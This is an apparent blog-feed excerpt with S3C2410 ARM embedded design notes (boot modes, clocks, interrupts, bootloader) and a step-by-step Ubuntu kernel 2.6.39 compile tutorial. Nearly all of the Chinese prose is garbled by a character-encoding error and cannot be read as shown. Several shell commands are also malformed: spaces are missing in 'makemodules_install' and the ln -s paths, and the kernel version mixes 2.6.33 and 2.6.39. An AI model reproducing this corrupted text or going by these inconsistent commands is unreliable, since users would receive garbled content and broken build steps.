&lt;p>ä¸ä¸è¬çARMç³»ç»ç¸åï¼é½éè¦å¾®å¤çå¨ãçµæºãæ¶æ¯ãå¤ä½ãå­å¨å¨ï¼flashãSDRAMï¼ãJTAGæ¥å£ç­ï¼å·ä½æåµå¦ä¸ï¼ï¼éè¦å¯¹OM0åOM1éç½®çµå¹³ä»¥å³å®å¯å¨æ¹å¼ï¼å¯¹OM2åOM3éç½®çµå¹³ä»¥å³å®æ¶éæºãï¼&lt;/p>
&lt;ul>
&lt;li>çµæºè®¾è®¡ï¼å¤çå¨ç¨1.8Vï¼RTCç»æ¶éæ¨¡åä¾çµ1.8Vï¼å­å¨å¨åæ®éIOç¨3.3Vï¼ADCæ¨¡åç¨3.3Vï¼å¯è§æå°ç³»ç»æå°è¦ç¨3.3å1.8ä¸¤ç§ç´æµç¨³åãè¯¾ç¨å®éªä¸­çµæºçµå5Vï¼åå«ç¨LM1085ç¨³å3.3Vï¼ç¨AS1117ç¨³å1.8Vã&lt;/li>
&lt;li>æ¶æ¯è®¾è®¡: 2410çæ¶éæ§å¶é»è¾å¯ä»¥äº§çç³»ç»æéè¦çæ¶éï¼åæ¬CPUçFCLKï¼åAHBæ»çº¿çHCLKï¼APBçPCLKãåé¨æä¸¤ä¸ªéç¸ç¯PLLï¼MPLLæä¾åä¸ä¸ªï¼UPLLç»USBæä¾48MHZçæ¶éã&lt;/li>
&lt;li>ä¸»æ¶éæºï¼UPLLåMPLLçæ¶éæºï¼å¯ä»¥éæ©æ¯æ¥èªå¤é¨æ¶éè¿æ¯å¤é¨æ¶æ¯ï¼è¿æ¯ç±OM2åOM3çç®¡èç¡®å®çï¼å¯ä»¥OM2åOM3åæ¶æ¥ä½çµå¹³ï¼éæ©å¤é¨æ¶æ¯ï¼æ¶æ¯å ä¸15pFèµ·æ¯çµå®¹ï¼ç»è¿éç¸ç¯åé¢å¯ä»¥è¾¾å°ï¼ã&lt;/li>
&lt;li>å¤ä½çµè·¯è®¾è®¡:å¯ä»¥å¨nRESETç«¯è®¾è®¡å51åçæºé£æ ·çé»å®¹å¤ä½çµè·¯ï¼ä½ä¸ºäºç¨³å®ï¼å¯ä»¥ä½¿ç¨å¤ä½è¯çå¦MAX811æIMP811ã&lt;/li>
&lt;li>JTAGæ¥å£è®¾è®¡: æ20éå14éä¸¤ç§JTAGæ¥å£ã&lt;/li>
&lt;li>å­å¨å¨è®¾è®¡: 2410æèªå·±çå­å¨å¨æ§å¶å¨ï¼å¹¶ä¸è§å®äºåªäºbankç©ºé´æ¯RAMåªäºæ¯FLASHï¼å­å¨å¨è¯çä¸¥æ ¼æç§DATASHEETä¸çè¦æ±åæ æçå¼èè¿æ¥æ¹å¼ä¸å­å¨å¨æ§å¶å¨çå­å¨å¨æ¥å£ç¸è¿å°±å¯ä»¥ï¼æ§å¶å¨ä¼æ ¹æ®å°åäº§çè¯»åå­å¨å¨è¯ççæ¶åºï¼å®æå­åæ°æ®çæä½ã&lt;/li>
&lt;/ul>
&lt;h4 id="2410norånandå¯å¨è¿ç¨åæ">2410norånandå¯å¨è¿ç¨åæï¼&lt;/h4>
&lt;p>&lt;code>NOR flash&lt;/code>:è¯»åéåº¦é«ãèæ¦åéåº¦ä½ï¼å®¹éå°ï¼ä»·æ ¼é«ï¼å°åçº¿åæ°æ®çº¿åå¼ï¼éç¨SRAMæ¥å£ã
&lt;code>NAND flash&lt;/code>:è¯»éåº¦ä¸å¦NORflash
ä½æ¯æ¦åéåº¦é«ï¼å®¹éå¤§ï¼ä»·æ ¼ä½ï¼æåä»£ç¡¬ççè¶å¿ï¼ä½æ¯å°åçº¿åæ°æ®å¤ç¨ï¼éè¦ç¨åºéåæè½è¯»åæ°æ®ãå¯ä»¥éè¿è·³çº¿è®¾ç½®æ¶ä»NAND FLASHå¯å¨è¿æ¯ä»NOR FLASHå¯å¨ã&lt;/p>
&lt;blockquote>
&lt;p>NANDå¯å¨çä¼å¿ï¼ä¾¿å®ãå®¹éå¤§ãä½æ¯è¯»åé»è¾ä¸è½ç¨ç¡¬ä»¶äº§çï¼ä¹å°±æ¯æ²¡åæ³æ¥å°BANKç©ºé´éï¼å¿é¡»æç¨åºéåæè½è¯»åï¼æä¸é¨çæ§å¶å¨æ¥å£ï¼è¯å®è¦å¯å­å¨ç¼ç¨å ä¸ç¨åºéåæè½è¯»åï¼æ²¡æPCçæ ¹æ­£èçº¢ï¼ï¼æä»¥çè®ºä¸å®æ¯ä¸å¯ä»¥ç¨æ¥å¯å¨ç³»ç»çï¼å ä¸ºé£ä¹åä»ä¹ç¨åºé½æ²¡æï¼è¦æ³è¯»åå®å¿é¡»æ¯ç³»ç»è£è½½å®äºèä¸æç¨åºäºãä½æ¯ä¸æéç¨äºSRAMæ å°è§£å³äºè¿ä¸ªé®é¢ï¼ä¸é¢å°±æ¯è¿ä¸ªè¿ç¨ï¼&lt;/p>
&lt;/blockquote>
&lt;p>çµè·¯ä¸­ä½¿&lt;code>OM1&lt;/code>å&lt;code>OM0&lt;/code>é½æ¥ä½çµå¹³ï¼ä»&lt;code>NAND FLASH&lt;/code>ä¸­å¯å¨ãï¼2410æNAND FLASHæ§å¶å¨ï¼è¿æ¥NAND Flashè¯çï¼äº§çè¯»åæ¶åºï¼&lt;/p>
&lt;p>å¨è¯¥æ¨¡å¼ä¸ï¼2410çå4KBå°åç©ºé´å¯¹åºä¸ä¸ªåå­å«åâèµ·æ­¥ç³âçSRAMï¼ç³»ç»å¯å¨æ¶ï¼èªå¨å°NAND FLASHçå4KBæ°æ®å è½½å°èµ·æ­¥ç³ä¸­ï¼ç¶åç³»ç»èªå¨æ§è¡è¿äºå¯å¨å¼å¯¼ä»£ç ï¼CPUä»åé¨RAMç0x00000000ä½ç½®å¼å§å¯å¨ãè¿ä¸ªè¿ç¨ä¸éè¦ç¨åºå¹²æ¶ãä¹å°±æ¯ç±»ä¼¼äºSTARTUP.Sçåè½ï¼åå§åå¼å¸¸åéè¡¨ãå æ ãå°NAND FLASHä¸­çä»£ç (æä»£ç æ¯æå½)æ·è´å°SDRAMä¸­è¿è¡ã&lt;/p>
&lt;h4 id="nor-flash">NOR FLASH&lt;/h4>
&lt;p>éç¨ççæ¯SRAMæ¥å£ï¼å¯ä»¥ç´æ¥å°å­å¨å¨æ§å¶å¨ä¸ï¼ARMåæ ¸äº§ççæ¶åºè½å¯¹å¶è¯»åãå°bank0ä¸æ¥ä¸NORflashè¯çãä¸çµäº§çå¤ä½å¼å¸¸åä¼èªå¨ä»NOR
flashä¸­å¯å¨ã&lt;/p>
&lt;h4 id="2410çä¸­æ­å¤çæµç¨">2410çä¸­æ­å¤çæµç¨ï¼&lt;/h4>
&lt;p>é¦ååºè¯¥æç¡®2410ä¸ARMåæ ¸çå¼å¸¸å¤çç³»ç»çè§è²ï¼æ ¹æ®ä¹åçARMå¼å¸¸å¤çæµç¨ï¼æä»¬æ¸æ¥æäºäºåªäºæ¯CPUçç¡¬ä»¶æºå¶ã2410éè¿ä¸­æ­æ§å¶å¨åè®¸ä»¥ä¼åçº§çæ¹å¼å°å åä¸ªä¸­æ­æºå±åç¨ä¸ä¸ªIRQãä¸ä¸ªä¸­æ­ç³è¯·æåºåï¼IRQå¼å¸¸åçï¼åæ¢æ¨¡å¼ãä¿å­CPSRãä¿å­PCï¼ç¶åè·³è½¬å°handleIRQå½æ°ï¼ç¶åè·³è½¬å°ISRIRQ(è¿åªæ¯ä¸ä¸ªå¤§æ¦æµç¨ï¼ä¹è®¸ä¼å®ä¹æ´å¤çè·³è½¬)æ ¹æ®ä¸­æ­æºåéè¡¨çé¦å°åååç§»éå¯å­å¨æ¾åºå°åºæ¯åªä¸ªä¸­æ­åçäºãç¶åè·³è½¬å°ç¸åºçä¸­æ­å¤çå½æ°ï¼æ¯å¦è·³å°ä¸²å£ä¸­æ­ï¼è¿å¯ä»¥æ ¹æ®æèµ·ä½ï¼å³ä¸­æ­æ å¿ä½ï¼åæ¬¡å¤æ­å°åºæ¯æ¥æ¶ä¸­æ­è¿æ¯åéå®æä¸­æ­ãä¹å°±æ¯è¯´2410å¤çæµç¨é¤äºARMå¯¹å¼å¸¸çååºæ¯ç¡¬ä»¶æºå¶å¤ï¼å¶ä½çé½æ¯ä»£ç å®ç°çãæä»¬å¨ç¼ç¨çæ¶åæ²¡æåçè¯ï¼é£ä¹æ¯ç¼è¯å¨å è¿å»çã&lt;/p>
&lt;h4 id="2410å¯¹åµå¥çå¤ç">2410å¯¹åµå¥çå¤ç&lt;/h4>
&lt;p>æ¯èµ·2410çå¤çæµç¨ä¸åçæ¯ï¼å ä¸ºæäºä¸­æ­æ§å¶å¨ï¼è¿å°±æ¯å®ç°é«ä¼åçº§åµå¥çç¡¬ä»¶åºç¡ï¼å ä¸ºæ¯ä¸æ¬¡è¿å¥å¼å¸¸æ¨¡å¼ç¨æ·é½ä¼ä¿å­ç¯å¢ï¼è¿å°±æ¯ä¸­æ­åµå¥çè½¯ä»¶åºç¡ãCPUçå¼å¸¸å¤çæºå¶æ»æ¯é£äºï¼å¾æç¡®çãææ­£å¨æ§è¡ä¸ä¸ªä¸­æ­æå¡ç¨åºï¼ç¶ååæ¬¡åçå¼å¸¸ï¼ä¿å­ï¼è·³è½¬ï¼CPUï¼ãåæ¬¡å¤æ­æ¯åªä¸ªä¸­æ­ï¼è¿å»ä¹ååæ ï¼è¿è¡å¦ä¸ä¸ªä¸­æ­çæå¡ç¨åºï¼è¿è¡å®è¿åï¼è¿æ¯å°±æ¯è¿åå°ä¸ä¸ä¸ªä¸­æ­äºãä¸ä¸ä¸ªä¸­æ­è¿è¡å®ï¼ä¸è¿åå°±æ¯è¿ååçå¼å¸¸åçç¶æã&lt;/p>
&lt;p>S3C2410çä¸²å£ãç«¯å£ãå¤é¨ä¸­æ­ãADç­åå¯å­å¨çç¼ç¨è½åï¼ä¼è¯»datasheetãä¼ç¼ç¨ãä½ä¸ãå®éªçç¸å³ä»£ç ï¼
å¯å­å¨çèµå¼æä»¤&lt;/p>
&lt;pre>&lt;code class="language-c">LDR R0ï¼=GPHCON
LDR R1,=0X2AFAAA
STR R1ï¼[R0]
&lt;/code>&lt;/pre>
&lt;h4 id="æ¶éçé¨ççç¸å³æ¦å¿µ">æ¶éãçé¨ççç¸å³æ¦å¿µ&lt;/h4>
&lt;ul>
&lt;li>æ¶é: æ´ä¸ªç³»ç»æä¾åæ­¥èå²ï¼åäººçèæä¸æ ·ã&lt;/li>
&lt;li>çé¨çï¼å¶å®æ¯ä¸ä¸ªè®¡æ°å¨ï¼å½å®è®¡æ°æº¢åºçæ¶åï¼ä¼ä½¿ç³»ç»å¤ä½ï¼æä»¥å®çä½ç¨æ¯é²æ­¢ç³»ç»æ­»æºãæå¼çé¨çä¹åï¼å½ä»£ç è·é£æèé·å¥æ­»å¾ªç¯ä¹åï¼å°±ä¸è½åçï¼ä¹å°±æ¯ä¸è½æ¸é¤è®¡æ°å¼ï¼é£ä¹å®å°±ä¼ä½¿ç³»ç»éå¯ã&lt;/li>
&lt;li>VIVI&lt;/li>
&lt;/ul>
&lt;h4 id="ä»ä¹æ¯bootloader">ä»ä¹æ¯bootloader&lt;/h4>
&lt;p>Bootloaderï¼ä¸ºå¼å¯¼å è½½ç¨åºï¼æ¯åµå¥å¼ç³»ç»å çµåè¿è¡çç¬¬ä¸æ®µä»£ç ï¼ç¸å½äºPCæºçBIOSã
Bootloaderå¨ç³»ç»ä¸­çä½ç½®ï¼ éå¸¸åºåå¨ç¡¬ä»¶ä¸çæä¸ªåºæå­å¨è®¾å¤ä¸ï¼å çµåèªå¯å¨ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-Linux-Embedded%20-System-Design/2018-10-04-16-04-02.png" alt="">&lt;/p>
&lt;p>&lt;strong>Bootloaderåè½&lt;/strong>ï¼ åå§åï¼ç»CPUåéçå·¥ä½ç¯å¢ï¼ç¸å½äºSTARTUP.Sï¼ï¼ä»¥ä¾¿ä¸ºæç»è°ç¨æä½ç³»ç»åæ ¸æç¨æ·åºç¨ç¨åºå¢ãå è½½åæ ¸ï¼ä¸è½½åæ ¸æèæ ¹æä»¶ç³»ç»ã&lt;/p>
&lt;h4 id="bootloaderæä½æ¨¡å¼">Bootloaderæä½æ¨¡å¼&lt;/h4>
&lt;p>æå¯å¨å è½½åä¸è½½ä¸¤ç§æ¨¡å¼ã&lt;/p>
&lt;ul>
&lt;li>å¯å¨å è½½æ¨¡å¼æ¯Bootloaderçæ­£å¸¸å·¥ä½æ¨¡å¼ï¼å¨åµå¥å¼äº§ååå¸çæ¶ä¾¯ï¼Bootloaderå¿é¡»å·¥ä½å¨è¿ç§æ¨¡å¼ä¸ãå³åå§åCPUçå·¥ä½ç¯å¢ä¹åï¼å°åæ ¸å¦RAMæ§è¡ã&lt;/li>
&lt;li>ä¸è½½æ¨¡å¼ï¼ç®æ æºä¸çBootloaderå°éè¿ä¸²å£è¿æ¥æç½ç»è¿æ¥ç­éä¿¡ææ®µä»ä¸»æºä¸è½½æä»¶ãä¸»è¦æ¯ä¸è½½åæ ¸æ ååæ ¹æä»¶ç³»ç»æ åç­ãä»ä¸»æºä¸è½½çæä»¶éå¸¸é¦åè¢«Bootloaderä¿å­å°ç®æ æºçRAMä¸­ï¼ç¶ååè¢«Bootloaderåå°ç®æ æºä¸çFLASHç±»åºæå­å¨è®¾å¤ä¸­ãBootloaderçè¿ç§æ¨¡å¼éå¸¸å¨ç¬¬ä¸æ¬¡å®è£åæ ¸ä¸æ ¹æä»¶ç³»ç»æ¶è¢«ä½¿ç¨ï¼æ­¤å¤ï¼ä»¥åçç³»ç»æ´æ°ä¹ä¼ä½¿ç¨å°è¿ç§å·¥ä½æ¨¡å¼ã&lt;/li>
&lt;/ul>
&lt;h4 id="bootloaderå¯å¨è¿ç¨">Bootloaderå¯å¨è¿ç¨&lt;/h4>
&lt;p>ä¸çµä¹åï¼åå¯å¨CPUå³æ§è¡startup.sç±»ä¼¼åè½ä»£ç ï¼éç½®ä¸­æ­ãåå§åå æ ãæ·è´ä»£ç ç­ï¼ï¼ç¶åè¿è¡å è½½åæ ¸çåå¤è³å°åå§åä¸ä¸ªä¸²å£ï¼ä»¥ä¾¿åç»ç«¯ç¨æ·åé¦æ°æ®ãæ£æµç³»ç»åå­æ å°ï¼åªäºæ¯å¯ç¨çRAMï¼å¨è¿ä¸æ­¥ä¹åï¼å°æ£æµå¤é¨æé®ï¼ææé®æä¸å°è¿å¥ä¸è½½æ¨¡å¼ï¼æ²¡ææé®çè¯å°æ§è¡ä¸é¢çæ­¥éª¤ï¼å è½½åæ ¸ï¼&lt;/p>
&lt;ul>
&lt;li>å°kenelåæ ¹æä»¶ç³»ç»ä»flashè°å¥RAM&lt;/li>
&lt;li>ä¸ºåæ ¸å¯å¨è®¾ç½®åæ°&lt;/li>
&lt;li>è°ç¨åæ ¸ã&lt;/li>
&lt;/ul></description></item><item><title>Ubuntuç¼è¯ãæ´æ¢ãå é¤åæ ¸</title><link>http://www.guozet.me/post/Linux-kernel-update/</link><pubDate>Sat, 07 May 2016 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-update/</guid><description>&lt;p>ä¸ç´æ³å°èªå·±çlinuxåæ ¸æ´æ¢ä¸ä¸ï¼æ¢ä¸ä¸ªä½çæ¬çæ¹ä¾¿å¹³æ¶åå®éªè¯¾ç¨çæ¶åä½¿ç¨ï¼äºæ¯å°±å¼å§äºUbuntuä¸æ¢åæ ¸çè¿ç¨ï¼&lt;/p>
&lt;h1 id="ç®è¦æ¦è¿°">ç®è¦æ¦è¿°&lt;/h1>
&lt;p>åç³»ç»ï¼Ubuntu 10.10ï¼Virtualboxï¼å¹³å°ä¸­çlinuxåæ ¸2.6.35-22&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-26-50.png" alt="">&lt;/p>
&lt;p>éçº§ä¸ºï¼linuxåæ ¸2.6.39&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-27-06.png" alt="">&lt;/p>
&lt;p>å·ä½æä½ï¼&lt;/p>
&lt;ol>
&lt;li>é¦åä¸è½½Linux2.6.39åæ ¸å¹¶è§£åå°/usr/srcä¸&lt;/li>
&lt;li>å®è£å¿å¤è½¯ä»¶ç¼è¯å·¥å·
&lt;code>#apt-get install libncurses5-dev build-essentialkernel-package&lt;/code>&lt;/li>
&lt;li>åä¸ªé¾æ¥æä»¶#ln -s /usr/src/linux2.6.33/usr/src/linux&lt;/li>
&lt;li>è¿å¥linuxæä»¶#cd linux&lt;/li>
&lt;li>#make mrproper (å é¤ä»¥åå°.oæä»¶ï¼åæ¬¡æ´æ¢å¯ä¸ç¨)&lt;/li>
&lt;li>#make menuconfig (è¿éå¯ä»¥è®¾ç½®ä¸äºåæ°ï¼å¹¶çæ.configæä»¶)&lt;/li>
&lt;li>#make dep (å»ºç«ä¾èµå³ç³»)&lt;/li>
&lt;li>#make clean (å é¤æ²¡æç¨çæä»¶)&lt;/li>
&lt;li>#make bzImage (ç¼è¯linuxåæ ¸)&lt;/li>
&lt;li>#make modules (ç¼è¯linuxæ¨¡å)&lt;/li>
&lt;li>#makemodules_install (å®è£linuxæ¨¡å)&lt;/li>
&lt;li>#make install (å»ºç«initrdæä»¶, å è½½LKMç¨çç¨åº)&lt;/li>
&lt;li>çæinitrd.imgæä»¶ï¼&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">cd /lib/modules/2.6.39
update-initramfs -c -k 2.6.39
&lt;/code>&lt;/pre>
&lt;ol start="14">
&lt;li>
&lt;p>èªå¨æ¥æ¾æ°åæ ¸ï¼å¹¶æ·»å å°grubå¼å¯¼#update-grub&lt;/p>
&lt;/li>
&lt;li>
&lt;p>#shutdown -r now ï¼ç«å³éå¯ï¼éå¯åä¼åç°å¤äºä¸ä¸ªlinux2.6.33å°å¯å¨é¡¹ï¼&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>ä»¥ä¸è¿ç¨å¨é¨å¨rootæéä¸æä½**:**\&lt;/p>
&lt;hr>
&lt;h1 id="è¯¦ç»æ­¥éª¤åæ">è¯¦ç»æ­¥éª¤åæ&lt;/h1>
&lt;h3 id="ä¸è½½åæ ¸">ä¸è½½åæ ¸&lt;/h3>
&lt;p>åæ ¸ä¸è½½å®ç½ï¼
&lt;a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/&lt;/a>&lt;/p>
&lt;p>ä¸è½½åæ ¸ï¼2.6.39 è¯¥åæ ¸çæ¬ä¸èªå·±å½åç³»ç»åæ ¸çæ¬2.6.35-22æ¯è¾æ¥è¿&lt;/p>
&lt;p>æ¦å¿µï¼åæ ¸ï¼æ¯ä¸ä¸ªæä½ç³»ç»çæ ¸å¿ãå®è´è´£ç®¡çç³»ç»çè¿ç¨ãåå­ãè®¾å¤é©±å¨ç¨åºãæä»¶åç½ç»ç³»ç»ï¼å³å®çç³»ç»çæ§è½åç¨³å®æ§ãå¨å¹¿å¤§ç±å¥½èçæ¯æä¸ï¼åæ ¸çæ¬ä¸æ­æ´æ°ãæ°çåæ ¸ä¿®è®¢äºæ§åæ ¸çbugï¼å¹¶å¢å äºè®¸å¤æ°çç¹æ§ãå¦æç¨æ·æ³è¦ä½¿ç¨è¿äºæ°ç¹æ§ï¼ææ³æ ¹æ®èªå·±çç³»ç»åº¦èº«å®å¶ä¸ä¸ªæ´é«æï¼æ´ç¨³å®çåæ ¸ï¼å°±éè¦éæ°ç¼è¯åæ ¸ã&lt;/p>
&lt;p>ä¸ºä»ä¹éè¦éæ°ç¼è¯åæ ¸ï¼&lt;/p>
&lt;p>å¢å å¯¹æé¨ååè½çæ¯æï¼æ¯å¦ç½ç»ä¹ç±»ï¼å¯ä»¥æç¸åºé¨åç¼è¯å°åæ ¸ä¸­ï¼build-inï¼ï¼å¨åæ ¸å¯å¨æ¶å°±å¯ä»¥èªå¨æ¯æç¸åºé¨åçåè½ï¼è¿æ ·çä¼ç¹æ¯æ¹ä¾¿ãéåº¦å¿«ï¼æºå¨ä¸å¯å¨ï¼ä½ å°±å¯ä»¥ä½¿ç¨è¿é¨ååè½äº,æä»¬å¯å°ç»å¸¸ä½¿ç¨çé¨åç´æ¥ç¼è¯å°åæ ¸ä¸­ï¼æ¯å¦ç½å¡ãéæè°ç¨çç¼ºç¹æ¯ä¼ä½¿åæ ¸åå¾åºå¤§èµ·æ¥ï¼ä¸ç®¡ä½ æ¯å¦éè¦è¿é¨ååè½ï¼å®é½ä¼å­å¨ãä¹å¯ä»¥æè¯¥é¨åç¼è¯ææ¨¡åï¼moduleï¼ï¼è¦ä½¿ç¨çæ¶ååå¨æè°ç¨ãå¦æç¼è¯ææ¨¡åï¼å°±ä¼çæå¯¹åºç.o æä»¶ï¼å¨ä½¿ç¨çæ¶åå¯ä»¥å¨æå è½½ï¼ä¼ç¹æ¯ä¸ä¼ä½¿åæ ¸è¿ååºå¤§ï¼ç¼ºç¹æ¯ä½ å¾èªå·±æ¥è°ç¨è¿äºæ¨¡åã&lt;/p>
&lt;p>å®è£å¿å¤è½¯ä»¶ç¼è¯å·¥å·:.&lt;/p>
&lt;pre>&lt;code class="language-bash">apt-get install libncurses5-dev build-essential kernel-package**
&lt;/code>&lt;/pre>
&lt;p>è¿å ä¸ªæä»¶ä»ç»ï¼&lt;/p>
&lt;ul>
&lt;li>libncurses5-devæ¯ä¸ºä¹åéç½®åæ ¸è½è¿è¡ make menuconfigç¨åºååå¤&lt;/li>
&lt;li>Build-essentialä¸ºç¼è¯å·¥å·ï¼&lt;/li>
&lt;li>kernel-packageæ¯ç¼è¯åæ ¸å·¥å·ã&lt;/li>
&lt;/ul>
&lt;p>å¦æç³»ç»æ¾ç¤ºæ æ³æ¥æ¾å°è¿ä¸ä¸ªæä»¶ï¼è¾å¥#apt-get updateæ´æ°æ°æ®æºï¼æ´æ°å®ä¹åå³å¯æ¾å°è¿ä¸ä¸ªæä»¶äºã&lt;/p>
&lt;h3 id="ç¼è¯æ¿æ¢åæ ¸">ç¼è¯æ¿æ¢åæ ¸&lt;/h3>
&lt;h4 id="è§£ååæ ¸æä»¶linux-2639å°usrsrcä¸xx">è§£ååæ ¸æä»¶linux 2.6.39å°/usr/srcä¸xx&lt;/h4>
&lt;p>é¦ååå°ä¸è½½çåæ ¸æ·è´å°/usr/srcç®å½ä¸ï¼/usr/src/ç®å½æ¯linuxåæ ¸æºç å­æ¾çç®å½ï¼éé¢çåæ ¸æºç ç®å½ä¸ºï¼linux-2.XX.XXç®å½ç­ã&lt;/p>
&lt;p>è¿éè§£åå°ä»»ä½ç®å½é½è¡ï¼å ä¸ºå¨è¿éæä»¬æ¯è¦å¢å ä¸ä¸ªåæ ¸ï¼èä¸æ¯è¦çæåæç³»ç»çåæ ¸ï¼å³ä½¿æ¯è¦çæåæç³»ç»åæ ¸ï¼ä¹å¯ä»¥å¨åé¢æ§è¡#make install èªå¨å°±ä¼å°å¯¹åºæä»¶æ·è´å°æ¬æºç¸åºçç®å½ä¸å»äºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-27-39.png" alt="">&lt;/p>
&lt;p>è§£åå½ä»¤ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">tar -jxvf linux-2.6.39.tar.bz2
&lt;/code>&lt;/pre>
&lt;p>æ³¨ï¼è¾æ°çåæ ¸æä»¶ä»¥tar.xzç»å°¾çåç¼©æä»¶æ¶ï¼å¦ä½è§£å&lt;/p>
&lt;pre>&lt;code class="language-bash">xz -d ***.tar.xz
tar -xvf ***.tar
&lt;/code>&lt;/pre>
&lt;p>å¯ä»¥çå°è¿ä¸ªåç¼©åä¹æ¯æååååç¼©ï¼å¤é¢æ¯xzåç¼©æ¹å¼ï¼éå±æ¯taræåæ¹å¼ãè¡¥åï¼ç®åå¯ä»¥ç´æ¥ä½¿ç¨ &lt;code>tar xvJf ***.tar.xz&lt;/code>æ¥è§£å&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-28-54.png" alt="">&lt;/p>
&lt;p>è¿å¥åæ ¸æºç ç®å½ï¼&lt;code>#cd /usr/src/linux-2.6.39/&lt;/code>å¯ä»¥æ¥çç¸åºåæ ¸æä»¶&lt;/p>
&lt;p>åä¸ªé¾æ¥æä»¶&lt;code>#ln -s /usr/src/linux2.6.39 /usr/src/linux &lt;/code>
è¿å¥linuxæä»¶&lt;code>#cd /usr/src/linux&lt;/code>&lt;/p>
&lt;p>&lt;code>/usr/src/linux&lt;/code>è¿ä¸ªç®å½æ¯ç¼è¯åæ ¸æ¶å­æ¾æºä»£ç çç®å½ï¼èï¼usr/src/linux2.6.33è¿ä¸ªç®å½æ¯å®éå­æ¾ä»£ç çç®å½ï¼å³å¨&lt;code>/usr/src&lt;/code>ä¸­å»ºç«ä¸ä¸ªè½¯é¾æ¥&lt;/p>
&lt;h4 id="å®å¶åæ ¸">å®å¶åæ ¸&lt;/h4>
&lt;p>&lt;strong>#make mrproper&lt;/strong>&lt;/p>
&lt;p>æ¸çä»¥åå è½½çæ¨¡åï¼ç¬¬ä¸æ¬¡å¯çç¥&lt;/p>
&lt;p>å¨æ¯æ¬¡éç½®å¹¶éæ°ç¼è¯åæ ¸åéè¦åæ§è¡âmakemrproperâå½ä»¤æ¸çæºä»£ç æ ï¼åæ¬è¿å»æ¾ç»éç½®çåæ ¸éç½®æä»¶â.configâé½å°è¢«æ¸é¤ãå®éªå®æä¹åï¼å¨æµè¯äºä¸ä¸è¿ä¸ªå½ä»¤ï¼å¦ä¸å¾æç¤ºï¼å³è¿è¡æ°çç¼è¯å·¥ä½æ¶å°åæ¥æ§çéç½®æä»¶ç»å é¤å°ï¼ä»¥åå½±åæ°çåæ ¸ç¼è¯ã&lt;/p>
&lt;p>&lt;img src="https://img-blog.csdn.net/20141203173804265" alt="">&lt;/p>
&lt;p>å³æ£æ¥ææ ä¸æ­£ç¡®ç.oæä»¶åä¾èµå³ç³»ï¼å¦æä½¿ç¨åä¸è½½çå®æ´çæºç¨åºåå³ç¬¬ä¸æ¬¡è¿è¡ç¼è¯ï¼é£ä¹æ¬æ­¥å¯ä»¥çç¥ãèå¦æä½ å¤æ¬¡ä½¿ç¨äºè¿äºæºç¨åºç¼è¯åæ ¸ï¼åæå¥½è¦åè¿è¡ä¸ä¸è¿ä¸ªå½ä»¤ã&lt;/p>
&lt;p>&lt;code>#make menuconfig&lt;/code>&lt;/p>
&lt;p>è¿éå¯ä»¥è®¾ç½®ä¸äºåæ°ï¼å¹¶çæ.configæä»¶, ä½¿ç¨makemenuconfig çæçåæ ¸éç½®æä»¶ï¼å³å®å°åæ ¸çåä¸ªåè½ç³»ç»ç¼è¯è¿åæ ¸è¿æ¯ç¼è¯ä¸ºæ¨¡åï¼æèä¸ç¼è¯ã&lt;/p>
&lt;p>å¨è¿éå°±ä¸ä»ç»å·ä½çåæ ¸éç½®æä½ï¼ä½æ¯å»ºè®®å°±ç®ä¸æç®éç½®ä»ä¹ä¹æ§è¡ä¸ä¸make menuconfigè¿ä¸ªå½ä»¤ï¼å¹¶å¨éåºçæ¶åè¿è¡ä¿å­ï¼å ä¸ºå¦æä¸æ§è¡æ­¤æä½çè¯å¨åé¢makeç¼è¯åæ ¸çæ¶åä¼æç¤ºä½ åç­å¾å¤é®é¢ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-29-47.png" alt="">&lt;/p>
&lt;p>è¿ä¸æ­¥å¯ä»¥&lt;code>#cp /boot/config-XX /usr/src/linux/.config&lt;/code>ï¼å³ä½¿ç¨å½åç³»ç»éç½®æä»¶ï¼ä¹åè¿å¥&lt;code>make menuconfig &lt;/code>éæ©loadéç½®æä»¶ä¹åï¼ååç»å¾®æ¹å¨ï¼æèä¸æ¹å¨ä¹å¯ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-29-58.png" alt="">&lt;/p>
&lt;p>æ§è¡&lt;code>#cp /boot/config&lt;/code>-ï¼ç¶åæä¸Tabé®ï¼ç³»ç»ä¼èªå¨å¡«ä¸è¯¥ç®å½ä¸ç¬¦åæ¡ä»¶çæä»¶åï¼ç¶åç»§ç»­è¾å¥&lt;code> .config&lt;/code>ï¼ç®çæ¯ä½¿ç¨å¨bootç®å½ä¸çåéç½®æä»¶ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-30-07.png" alt="">&lt;/p>
&lt;p>3.ç¼è¯å®è£åæ ¸åæ¨¡å&lt;/p>
&lt;p>&lt;code>#make dep å»ºç«ä¾èµå³ç³»&lt;/code>&lt;/p>
&lt;p>æ ¹æ®ä¸ä¸æ­¥ä¸­å è½½çéç½®åå®¹ï¼.configï¼å»ºç«æä»¶çä¾èµå³ç³»ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2016-07-12-Linux-kernel-update/2018-09-19-02-30-17.png" alt="">&lt;/p>
&lt;p>&lt;code>#make clean æ¸é¤åæ ¸ç¼è¯çç®æ æä»¶&lt;/code>&lt;/p>
